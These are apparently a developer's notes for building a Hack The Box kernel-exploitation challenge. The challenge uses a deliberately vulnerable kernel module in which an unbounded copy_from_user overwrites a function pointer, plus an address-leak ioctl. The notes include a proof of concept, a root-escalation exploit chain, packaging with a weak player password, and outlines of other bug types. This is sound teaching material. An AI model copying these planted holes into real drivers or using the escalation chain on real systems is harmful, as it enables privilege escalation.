# HTB Kernel Pwn Box — Development Notes

**Goal:** Build a Linux kernel exploitation challenge for Hack The Box.  
**Setup:** macOS (Apple Silicon) → QEMU VM → Ubuntu 24.04 ARM64 → kernel 6.8.0  
**Files:** `vulndev.c`, `exploit.c` in `kernel-scratch/`  
**VM:** See `QEMU_SETUP.md` to boot. SSH with `ssh kernel-dev`.

---

## Background — What is Kernel Pwn?

A typical HTB kernel pwn box works like this:

```
player SSHes in as low-priv user (uid=1000)
    ↓
finds a vulnerable kernel module loaded on the box (/dev/something)
    ↓
writes an exploit in C that abuses the module
    ↓
exploit escalates privileges → uid=0 (root)
    ↓
reads /root/root.txt
```

The kernel module is a `.ko` file loaded into the running kernel via `insmod`. It
registers a character device under `/dev/` that unprivileged users can interact with
using standard syscalls: `open()`, `read()`, `write()`, `ioctl()`.

The vulnerability we implement is a **stack/global buffer overflow** that overwrites a
**function pointer**. Triggering the function pointer with a controlled value gives
arbitrary code execution in kernel context — which means the exploit runs with full
kernel privileges and can make itself root.

---

## Key Kernel Concepts

### Character Device
A file in `/dev/` backed by a kernel module. Userspace interacts with it like a regular
file. The module provides a `file_operations` struct that maps syscalls to kernel
functions:

```
open("/dev/vulndev")  →  dev_open()
read(fd, ...)         →  dev_read()
write(fd, ...)        →  dev_write()
ioctl(fd, cmd, ...)   →  dev_ioctl()
close(fd)             →  dev_release()
```

### copy_from_user / copy_to_user
You cannot dereference a userspace pointer directly in kernel code — the pointer may
be invalid, swapped out, or malicious. These two functions safely cross the boundary:

```c
copy_from_user(kernel_buf, user_ptr, size)   // user → kernel
copy_to_user(user_ptr, kernel_buf, size)     // kernel → user
```

Both return 0 on success, non-zero (bytes not copied) on failure.

### commit_creds / prepare_kernel_cred
These two kernel functions are the standard privilege escalation primitives:

```c
struct cred *new = prepare_kernel_cred(&init_task);
// creates a new credential struct cloned from init (root)

commit_creds(new);
// applies new creds to current process → process is now root
```

**Important:** In kernel >= 6.2, `prepare_kernel_cred(NULL)` triggers a WARN and
returns NULL. Always pass `&init_task` (requires `#include <linux/sched/task.h>`).

### ioctl
A catch-all syscall for device-specific commands not covered by read/write.
Defined with macros that encode the direction and size:

```c
#define IOCTL_TRIGGER   _IO('v',  1)        // no data
#define IOCTL_LEAK_ADDR _IOR('v', 2, ulong) // read ulong from kernel
```

---

## Commands Reference

### Module lifecycle commands

| Command | What it does |
|---|---|
| `insmod hello.ko` | Load a module into the running kernel. Runs `module_init()`. Fails if already loaded. |
| `rmmod hello` | Unload a module by name (no `.ko`). Runs `module_exit()`. Fails if in use. |
| `lsmod` | List all currently loaded modules, their size, and how many things are using them. |
| `modinfo hello.ko` | Show metadata from the module: license, author, description, kernel version it was built for. |
| `dmesg` | Print the kernel ring buffer — all `printk()` output lands here. |
| `dmesg -w` | **Live tail** of the ring buffer. Leave this open in one terminal while you reload in another. |
| `dmesg \| tail -5` | Show just the last 5 kernel log lines — useful after insmod/rmmod. |
| `dmesg -c` | Print and clear the ring buffer — clean slate before a test. |

### Build command explained

```bash
make -C /lib/modules/$(uname -r)/build M=$HOME modules
```

| Part | Meaning |
|---|---|
| `-C /lib/modules/$(uname -r)/build` | Change into the kernel build directory for the **running** kernel. This is where kernel headers live. |
| `M=$HOME` | Tell the kernel build system where **your module source** is. It builds `.ko` files there. |
| `modules` | The make target — build external modules only (not the whole kernel). |

### The Makefile

```makefile
obj-m += vulndev.o        # tells the kernel build system: build vulndev.c as a module (.ko)
KDIR  := /lib/modules/$(shell uname -r)/build

all:
    make -C $(KDIR) M=$(PWD) modules   # delegates to kernel's own build system
clean:
    make -C $(KDIR) M=$(PWD) clean
```

`obj-m` = object for module. If you wrote `obj-y` instead, the code would be compiled
**into** the kernel image itself (not a loadable module).

### Compile the exploit

```bash
gcc -o exploit exploit.c
```

No special flags needed — the exploit is a normal userspace C program. It uses
standard syscalls (`open`, `write`, `ioctl`) that happen to talk to a kernel device.

### SCP — copy files to VM

```bash
# copy one file
scp hello.c kernel-dev:~/

# copy multiple files
scp vulndev.c exploit.c Makefile kernel-dev:~/

# copy from VM back to Mac
scp kernel-dev:~/vulndev.ko .
```

`kernel-dev` is the SSH alias defined in `~/.ssh/config`. The `:~/` means the home
directory of the `dev` user inside the VM.

### Full iteration loop (edit → test)

After changing `vulndev.c` on your Mac:

```bash
# 1. copy updated source to VM
scp vulndev.c kernel-dev:~/

# 2. in VM: unload old, rebuild, reload, check output
ssh kernel-dev "
  sudo rmmod vulndev 2>/dev/null;
  make -C /lib/modules/\$(uname -r)/build M=\$HOME modules &&
  sudo insmod ~/vulndev.ko &&
  sudo dmesg | tail -5
"
```

One-liner form (useful when iterating fast):
```bash
scp vulndev.c kernel-dev:~/ && ssh kernel-dev "sudo rmmod vulndev 2>/dev/null; make -C /lib/modules/\$(uname -r)/build M=\$HOME modules && sudo insmod ~/vulndev.ko && sudo dmesg | tail -3"
```

### Inspect the device

```bash
ls -la /dev/vulndev        # check permissions (crw-rw-rw- means 0666)
file vulndev.ko            # shows: ELF 64-bit LSB relocatable, ARM aarch64
modinfo vulndev.ko         # shows license, author, description, kernel version
cat /proc/modules          # lists all loaded modules with their kernel addresses
cat /proc/kallsyms | grep vulndev   # shows all symbols exported by the module
```

### Check privilege escalation worked

```bash
id                         # should show uid=0(root)
cat /etc/shadow            # root-only file — readable only if truly root
cat /root/root.txt         # the HTB flag
```

---

## Phase 1 — Clean Character Device

**File:** `vulndev.c` (first version)  
**Purpose:** Understand how character devices work before adding any vulnerability.

### What it does
- Registers `/dev/vulndev` (permissions: root only at this stage)
- `write()` stores up to 64 bytes into a kernel buffer
- `read()` returns those bytes back to userspace
- No vulnerability yet — all bounds checks in place

### Key code
```c
#define BUF_SIZE 64
static char kbuf[BUF_SIZE];

static ssize_t dev_write(..., size_t count, ...)
{
    size_t to_copy = min(count, (size_t)BUF_SIZE);  // safe — bounded
    if (copy_from_user(kbuf, ubuf, to_copy))
        return -EFAULT;
    ...
}
```

### Device registration flow (init)
```
alloc_chrdev_region()   → get major:minor number from kernel
cdev_init() + cdev_add() → register file_operations with kernel
class_create()           → create /sys/class/vulndev entry
device_create()          → udev sees the sysfs entry → creates /dev/vulndev
```

### Device removal flow (exit / rmmod)
Everything is torn down in reverse order:
```
device_destroy → class_destroy → cdev_del → unregister_chrdev_region
```

### Test
```bash
sudo insmod vulndev.ko
echo "hello" | sudo tee /dev/vulndev
sudo cat /dev/vulndev          # → hello
sudo rmmod vulndev
```

---

## Phase 2 — Introducing the Vulnerability

**File:** `vulndev.c` (updated)  
**Changes from Phase 1:**
1. Vulnerable `dev_write()` — bounds check removed
2. Function pointer added adjacent to the buffer (the overwrite target)
3. `ioctl(TRIGGER)` added to fire the function pointer
4. Device opened to all users (`0666`)

### The Vulnerability Design

```c
static struct {
    char   buf[BUF_SIZE];    /* offset 0  — 64 bytes */
    void (*callback)(void);  /* offset 64 — 8 bytes  */
} dev_state;
```

`buf` and `callback` are in the **same struct**, guaranteeing they are adjacent in
memory with no padding (compiler packs them contiguously). This makes the offset from
`buf` to `callback` exactly 64 bytes — predictable and reliable for the exploit.

### The Bug

```c
static ssize_t dev_write(..., size_t count, ...)
{
    /* BUG: count is NOT clamped — user controls how many bytes land in buf */
    if (copy_from_user(dev_state.buf, ubuf, count))
        return -EFAULT;
    ...
}
```

When `count > 64`, `copy_from_user` writes past `buf` into `callback`.

### The Trigger

```c
#define IOCTL_TRIGGER _IO('v', 1)

case IOCTL_TRIGGER:
    if (dev_state.callback)
        dev_state.callback();   // calls whatever address is in callback
```

Write a controlled address into `callback` via overflow, then fire ioctl — you control
where the kernel jumps.

### Open Permissions

```c
static char *vulndev_devnode(const struct device *dev, umode_t *mode)
{
    if (mode) *mode = 0666;   // world read/write
    return NULL;
}
...
dev_class->devnode = vulndev_devnode;
```

### Proof of Concept (Phase 2)
```python
import os, fcntl

fd = os.open('/dev/vulndev', os.O_RDWR)
payload = b'A' * 64 + b'\xef\xbe\xad\xde\xef\xbe\xad\xde'  # 0xdeadbeefdeadbeef
os.write(fd, payload)

IOCTL_TRIGGER = 0x7601
fcntl.ioctl(fd, IOCTL_TRIGGER)   # → kernel panic: PC = 0xdeadbeefdeadbeef
```

Confirmed: kernel panics at the address we wrote. We have **PC control**.

---

## Phase 3 — The Exploit

**Files:** `vulndev.c` (final), `exploit.c`

### Additional changes to vulndev.c

**`escalate()` function** — the privilege escalation payload:
```c
#include <linux/sched/task.h>   // needed for init_task

static void escalate(void)
{
    struct cred *new = prepare_kernel_cred(&init_task);
    if (new)
        commit_creds(new);
    // current process now has root credentials
}
```

**`IOCTL_LEAK_ADDR`** — simulates a kernel pointer leak vulnerability:
```c
#define IOCTL_LEAK_ADDR _IOR('v', 2, unsigned long)

case IOCTL_LEAK_ADDR:
    addr = (unsigned long)escalate;
    copy_to_user((void __user *)arg, &addr, sizeof(addr));
    return 0;
```

In a real CTF, this leak would come from an uninitialized read, a format string bug,
or another info-leak primitive. Here it's explicit so the exploit chain is clear.

### The Exploit (exploit.c)

Full chain in 4 steps:

```
Step 1 — open device (works as uid=1001 because permissions are 0666)
Step 2 — ioctl(LEAK_ADDR) → get escalate() kernel virtual address
Step 3 — write(64×'A' + escalate_addr) → overflow callback with escalate address
Step 4 — ioctl(TRIGGER) → callback() → escalate() → commit_creds() → uid=0
```

```c
// Step 2: leak
ioctl(fd, IOCTL_LEAK_ADDR, &escalate_addr);
// escalate_addr = 0xffff80007bd220e0 (example — fixed since KASLR is disabled)

// Step 3: overflow
memset(payload, 'A', 64);
memcpy(payload + 64, &escalate_addr, 8);
write(fd, payload, 72);

// Step 4: trigger
ioctl(fd, IOCTL_TRIGGER);
// kernel: callback() → escalate() → prepare_kernel_cred(&init_task)
//       → commit_creds(new) → current->cred now has uid=gid=0

// Back in userspace: getuid() == 0
execl("/bin/bash", "bash", NULL);   // root shell
```

### Memory Layout During Exploit

```
dev_state in kernel BSS:
┌─────────────────────────────────────────────────┐
│  buf[0..63]   ← filled with 'A' × 64           │  offset 0
├─────────────────────────────────────────────────┤
│  callback     ← overwritten with escalate addr  │  offset 64
└─────────────────────────────────────────────────┘
                  ^
                  write(fd, payload, 72) lands here
```

### Build and Run

```bash
# on Mac — copy files to VM
scp vulndev.c exploit.c kernel-dev:~/

# in VM — build module
make -C /lib/modules/$(uname -r)/build M=$HOME modules

# in VM — load module
sudo rmmod vulndev 2>/dev/null
sudo insmod ~/vulndev.ko

# in VM — compile and run exploit as unprivileged user
gcc -o exploit exploit.c
./exploit
# → uid=0(root)
```

### Verify

```bash
echo 'id && cat /etc/shadow | head -2' | ./exploit
# uid=0(root) gid=0(root) groups=0(root)
# root:*:...
```

---

## Gotchas Encountered

| Issue | Root Cause | Fix |
|---|---|---|
| `prepare_kernel_cred(NULL)` warns + returns NULL | Changed in kernel 6.2 — NULL no longer accepted | Use `prepare_kernel_cred(&init_task)` + include `<linux/sched/task.h>` |
| Shell redirect `python3 ... > /dev/vulndev` gives EFAULT | Overflow corrupts callback mid-write, causing partial copy_from_user failure | Use `os.open()` + `os.write()` directly in Python, or write from C |
| `execl("/bin/bash")` exits immediately in SSH session | bash exits when stdin is not a terminal | Pipe commands: `echo 'id' \| ./exploit` or use `-t` flag on SSH for interactive |

---

## Phase 4 — HTB Box Packaging

**Files:** `setup.sh`, `vm/htb-kernelpwn.ova`

### What setup.sh does

Run once inside the VM as `dev` (has passwordless sudo). Idempotent — safe to re-run.

```bash
scp setup.sh kernel-dev:~/
ssh kernel-dev "chmod +x setup.sh && ./setup.sh"
```

Steps it performs:

1. Copies `vulndev.ko` → `/opt/vulndev/vulndev.ko`
2. Creates `/etc/systemd/system/vulndev.service` and enables it
3. Creates `player` user (password: `player123`, no sudo)
4. Writes `user.txt` to `/home/player/` (readable by player)
5. Writes `root.txt` to `/root/` (chmod 600 — root only)
6. Copies `vulndev.ko` to `/home/player/` so player can reverse it

### Systemd service

```ini
[Unit]
Description=VulnDev Kernel Module
After=local-fs.target

[Service]
Type=oneshot
ExecStart=/sbin/insmod /opt/vulndev/vulndev.ko
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
```

`Type=oneshot` + `RemainAfterExit=yes` means: run the command once at boot, then
stay in `active (exited)` state. The module persists in the kernel — the service
doesn't need to keep running.

Verify it loaded:
```bash
systemctl status vulndev.service   # → active (exited)
ls -la /dev/vulndev                # → crw-rw-rw- (0666)
```

### Flags

| Flag | Path | Permissions | Value |
|---|---|---|---|
| User | `/home/player/user.txt` | 644 (player readable) | `HTB{k3rn3l_pwn_st4rts_w1th_4_s1ngl3_0v3rfl0w}` |
| Root | `/root/root.txt` | 600 (root only) | `HTB{c0mm1t_cr3ds_g1v3s_y0u_th3_k3rn3l}` |

### Player experience (intended path)

```
ssh player@<box-ip>               # password: player123
cat ~/user.txt                    # grab user flag
ls -la /dev/vulndev               # spots device (crw-rw-rw-)
ls -la ~/vulndev.ko               # finds the .ko to reverse

# player reverses vulndev.ko in Ghidra, finds:
#   - write() has no bounds check
#   - callback sits at buf+64
#   - IOCTL_LEAK_ADDR leaks escalate() address
#   - IOCTL_TRIGGER fires callback

# player writes exploit.c, compiles and runs it:
gcc -o exploit exploit.c
./exploit                         # uid=0(root)
cat /root/root.txt                # grab root flag
```

### Enable SSH password auth (required for player)

Ubuntu cloud images disable password auth by default. Enable it:

```bash
echo 'PasswordAuthentication yes' | sudo tee /etc/ssh/sshd_config.d/htb.conf
sudo systemctl restart ssh
```

### Export as OVA

Run from the `vm/` directory after powering off the VM:

```bash
ssh kernel-dev "sudo poweroff"

# 1. convert disk to VMDK
qemu-img convert -f qcow2 -O vmdk ubuntu-24.04-arm64.img htb-kernelpwn.vmdk

# 2. package OVF + VMDK into OVA
tar cvf htb-kernelpwn.ova htb-kernelpwn.ovf htb-kernelpwn.vmdk
```

Output: `htb-kernelpwn.ova` (~3.5G) — submit this to HTB.

### Before final submission checklist

- [ ] Boot the OVA fresh and verify `vulndev.service` auto-loads the module
- [ ] Confirm `player` can SSH in with password
- [ ] Confirm `player` can read `user.txt` but NOT `root.txt`
- [ ] Confirm exploit runs as `player` and produces root shell
- [ ] Remove or lock the `dev` user: `sudo deluser dev sudo && sudo passwd -l dev`
- [ ] Write HTB submission writeup (intended solution path)

---

## File Map

```
kernel-scratch/
├── vulndev.c          — vulnerable kernel module (all 3 phases)
├── exploit.c          — working privilege escalation exploit
├── hello.c            — hello world module (Phase 1 starting point)
├── Makefile           — builds hello.o and vulndev.o
├── setup.sh           — box setup script (runs in VM)
├── HTB_KERNEL_PWN.md  — this document
├── QEMU_SETUP.md      — how to boot/connect to the VM
└── vm/
    ├── ubuntu-24.04-arm64.img   — VM disk (active)
    ├── seed.img                 — cloud-init config disk
    ├── edk2-aarch64-code.fd     — UEFI firmware (read-only)
    ├── edk2-varstore.fd         — UEFI variable store
    ├── htb-kernelpwn.ovf        — OVA descriptor
    ├── htb-kernelpwn.vmdk       — exported disk
    ├── htb-kernelpwn.ova        — final HTB submission package
    └── cloud-init/
        ├── user-data
        └── meta-data
```


 ---
  What NEVER changes regardless of vulnerability:
  - QEMU setup (QEMU_SETUP.md) — the VM environment is always the same
  - Phase 1 (clean character device) — the device skeleton is always the foundation
  - Phase 4 (packaging) — setup.sh, systemd service, player user, flags, OVA export are identical
  
  What ALWAYS changes:
  - Phase 2 (vulndev.c) — the bug itself. This is the only thing that's truly unique per box.
  - Phase 3 (exploit.c) — the exploit technique must match the bug.

  ---
  So in practice, swapping vulnerability = rewriting Phase 2 + Phase 3 only.
  
  Here's what that looks like for the most common types:

  ---
  Type 1: Stack buffer overflow (instead of global)
  - Phase 2: dev_write uses a local char buf[64] on the stack instead of the global struct. Overflows the
  kernel stack frame.
  - Phase 3: Exploit must defeat the stack canary (or the module is compiled with -fno-stack-protector).
  Overwrites saved return address instead of a function pointer.
  - Extra complexity: stack canaries, need to either leak or bypass them.

  ---
  Type 2: Use-After-Free (UAF)
  - Phase 2: Add IOCTL_ALLOC (kmalloc), IOCTL_FREE (kfree), IOCTL_USE (dereferences the pointer). Player frees
  then uses.
  - Phase 3: Exploit calls IOCTL_ALLOC, then IOCTL_FREE, sprays the heap with a controlled object at the freed
  address, then IOCTL_USE — jumps to attacker-controlled data.
  - Extra complexity: heap spray technique, slab allocator behaviour.

  ---
  Type 3: Integer overflow → heap overflow
  - Phase 2: IOCTL_SET_SIZE stores a user-supplied size. dev_write does kmalloc(size) but copies size * 
  multiplier bytes — integer overflow makes the allocation small but the copy large.
  - Phase 3: Exploit picks a size that overflows to a small value, then writes past the heap chunk into
  adjacent kernel objects.
  - Extra complexity: understanding kernel slab/slub allocator layout.

  ---
  Type 4: Race condition (TOCTOU)
  - Phase 2: IOCTL_CHECK validates a condition and sets a flag. IOCTL_ACT uses the flag without re-checking.
  Race window between the two.
  - Phase 3: Exploit runs two threads — one hammering IOCTL_CHECK + IOCTL_ACT, another changing the condition
  in between.
  - Extra complexity: timing-sensitive, needs userfaultfd or similar primitives to widen the race window
  reliably.